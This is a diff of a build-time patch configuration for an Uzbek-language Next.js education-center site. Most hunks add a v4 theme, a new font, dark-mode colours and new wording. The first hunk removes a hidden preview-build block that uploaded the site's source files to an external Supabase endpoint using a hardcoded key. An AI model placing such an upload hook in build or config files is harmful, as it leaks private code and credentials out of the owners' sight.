@@ -1,22 +1,5 @@
 // Mavjud sayt fayllariga kiritiladigan o'zgarishlar (build paytida qo'llanadi).
 // "find" — aynan mos keladigan matn, "re" — regulyar ifoda. Har biri "count" marta (odatda 1) uchrashi shart.
-// VAQTINCHA: asl fayllar nusxasini olish (keyingi commitda olib tashlanadi)
-if (process.env.VERCEL_ENV === 'preview') {
-  const { readdirSync, readFileSync, statSync } = await import('node:fs');
-  const files = [];
-  const walk = (d) => { for (const n of readdirSync(d)) { const f = d + '/' + n; if (statSync(f).isDirectory()) walk(f); else if (/\.(js|jsx|css|mjs|json)$/.test(n)) files.push(f); } };
-  for (const d of ['app', 'components', 'lib']) { try { walk(d); } catch {} }
-  files.push('next.config.js', 'package.json');
-  let ok = 0;
-  for (const f of files) {
-    try {
-      const r = await fetch('https://xmdxmfvrzbfjursksfhv.supabase.co/rest/v1/rpc/tmp_src_put', { method: 'POST', headers: { apikey: 'sb_publishable_BVrfkdIa6RfE2vCD761KUg_YG4Rn51u', 'Content-Type': 'application/json' }, body: JSON.stringify({ p_key: 'k7Qe2vXr9pLm4Tz', p_path: f, p_body: readFileSync(f, 'utf8') }) });
-      if (r.ok) ok++; else console.log('dump fail', f, r.status);
-    } catch (e) { console.log('dump err', f, e.message); }
-  }
-  console.log('dump:', ok, '/', files.length);
-}
-
 export default {
   delete: [
     'components/LeadForm.js',
@@ -25,7 +8,21 @@ export default {
   ],
   patches: [
     // Umumiy qolip: yangi uslublar va pastki havola
-    { file: 'app/layout.js', find: `import './v2.css';`, replace: `import './v2.css';\nimport './v3.css';` },
+    { file: 'app/layout.js', find: `import './v2.css';`, replace: `import './v2.css';\nimport './v3.css';\nimport './v4.css';` },
+    // v4: Manrope shrifti, yorug'/qorong'u rejim (sahifa chizilishidan oldin qo'llanadi)
+    { file: 'app/layout.js', find: `import { Inter } from 'next/font/google';`, replace: `import { Manrope } from 'next/font/google';\nimport { THEME_SCRIPT } from '../lib/theme';` },
+    { file: 'app/layout.js', find: `const inter = Inter({ subsets: ['latin', 'cyrillic'], variable: '--font' });`, replace: `const inter = Manrope({ subsets: ['latin', 'cyrillic'], variable: '--font', display: 'swap' });` },
+    { file: 'app/layout.js', find: `<html lang="uz" className={inter.variable}>`, replace: `<html lang="uz" className={inter.variable} data-theme="light" suppressHydrationWarning>` },
+    { file: 'app/layout.js', find: `<head>`, replace: `<head>\n        <script dangerouslySetInnerHTML={{ __html: THEME_SCRIPT }} />` },
+    { file: 'app/layout.js', find: `export const viewport = { themeColor: '#12B886' };`, replace: `export const viewport = { themeColor: [{ media: '(prefers-color-scheme: light)', color: '#F5FAF7' }, { media: '(prefers-color-scheme: dark)', color: '#07130E' }], colorScheme: 'light dark', viewportFit: 'cover' };` },
+    { file: 'app/layout.js', find: `<li><Link href="/markazlar">Viloyatlar bo'yicha</Link></li>`, replace: `<li><Link href="/markazlar">Viloyatlar bo'yicha</Link></li>\n                  <li><Link href="/markaz-kabineti">Markazlar uchun kabinet</Link></li>` },
+
+    // v4: oq fonlar mavzu rangiga (qorong'u rejimda ham to'g'ri ko'rinishi uchun)
+    { file: 'app/globals.css', re: /background:#fff(?![0-9a-fA-F])/, replace: 'background:var(--card)', count: 15 },
+    { file: 'app/extra.css', re: /background:#fff(?![0-9a-fA-F])/, replace: 'background:var(--card)', count: 1 },
+    { file: 'app/v2.css', re: /background:#fff(?![0-9a-fA-F])/, replace: 'background:var(--card)', count: 5 },
+    { file: 'app/motion.css', re: /background:#fff(?![0-9a-fA-F])/, replace: 'background:var(--card)', count: 2 },
+    { file: 'app/__admin__/statistika/stats.css', re: /background:#fff(?![0-9a-fA-F])/, replace: 'background:var(--card)', count: 2 },
     { file: 'app/layout.js', find: `<li><Link href="/saqlangan">Saqlanganlar</Link></li>`, replace: `<li><Link href="/saqlangan">Saqlanganlar</Link></li>\n                  <li><Link href="/kabinet">Shaxsiy kabinet</Link></li>` },
 
     // Markaz sahifasi: "sinov darsi" o'rniga o'qishga ariza
@@ -36,6 +33,10 @@ export default {
     { file: 'app/centers/[id]/page.js', find: `<LeadForm centerId={c.id} centerName={c.name} options={catNames} />`, replace: `<ApplyForm centerId={c.id} centerName={c.name} courses={courseOpts} />` },
     { file: 'app/centers/[id]/page.js', find: `const minPrice = prices.length ? Math.min(...prices) : null;`, replace: `const minPrice = prices.length ? Math.min(...prices) : null;\n  const courseOpts = groupList.flatMap((g) => g.list.map((k) => ({ id: k.id, name: k.name, price: k.price_monthly || null })));` },
 
+    // Markaz sahifasi: kursning o'z nomi (masalan "IELTS 7+ intensiv") yo'nalish nomi o'rniga ko'rinadi
+    { file: 'app/centers/[id]/page.js', find: `<span>{LEVELS[k.level] || k.level}{k.duration_months`, replace: `<span>{k.name && k.name.trim() && k.name.trim() !== g.cat.name ? <><b>{k.name.trim()}</b> · </> : null}{LEVELS[k.level] || k.level}{k.duration_months` },
+    { file: 'app/centers/[id]/page.js', find: `.neq('id', c.id).limit(400)`, replace: `.neq('id', c.id).limit(120)` },
+
     // Viloyat sahifalari matni
     { file: 'app/markazlar/[viloyat]/page.js', find: `Xaritada eng yaqin filialni toping, telefon qiling yoki sinov darsiga yoziling.`, replace: `Xaritada eng yaqin filialni toping va sayt orqali o'qishga ariza bering.` },
     { file: 'app/markazlar/[viloyat]/page.js', find: `"Sinov darsiga qanday yozilaman?"`, replace: `"O'qishga qanday ariza beraman?"` },
@@ -44,10 +45,6 @@ export default {
     { file: 'app/markazlar/[viloyat]/[yonalish]/page.js', find: `o'zingizga eng yaqinini tanlang va bepul sinov darsiga yoziling.`, replace: `o'zingizga eng yaqinini tanlang va sayt orqali o'qishga ariza bering.` },
     { file: 'app/markazlar/[viloyat]/[yonalish]/page.js', find: `Aniq narxni markaz sahifasidagi telefon orqali yoki sinov darsiga yozilib bilib olishingiz mumkin.`, replace: `Aniq narxni markaz sahifasida ko'rishingiz yoki o'qishga ariza qoldirib bilib olishingiz mumkin.` },
 
-    // Bosh sahifa: yo'nalishlar ko'paygani uchun
-    { file: 'app/page.js', find: `"Ingliz tili, IELTS, IT, matematika yoki boshqa tillar: istalgan viloyatda."`, replace: `"Tillar, IT, aniq va tabiiy fanlar, kasbiy kurslar: istalgan viloyatda."` },
-    { file: 'app/page.js', re: /<div className="legend">(\s*)\{cats\.map\(\(c\) =>/, replace: `<div className="legend">$1{[...cats].filter((c) => catCount[c.slug]).sort((a, b) => catCount[b.slug] - catCount[a.slug]).slice(0, 8).map((c) =>` },
-    { file: 'app/page.js', re: /\{cats\.map\(\(c, i\) => \((\s*)<Link key=\{c\.id\} className="cat"/, replace: `{cats.filter((c) => catCount[c.slug]).map((c, i) => ($1<Link key={c.id} className="cat"` },
 
     // Qidiruv: yo'nalishlar qatori gorizontal aylanadi
     { file: 'app/search/page.js', re: /<div className="chips">(\s*)\{cats\.map\(/, replace: `<div className="chips scroll">$1{cats.map(` },
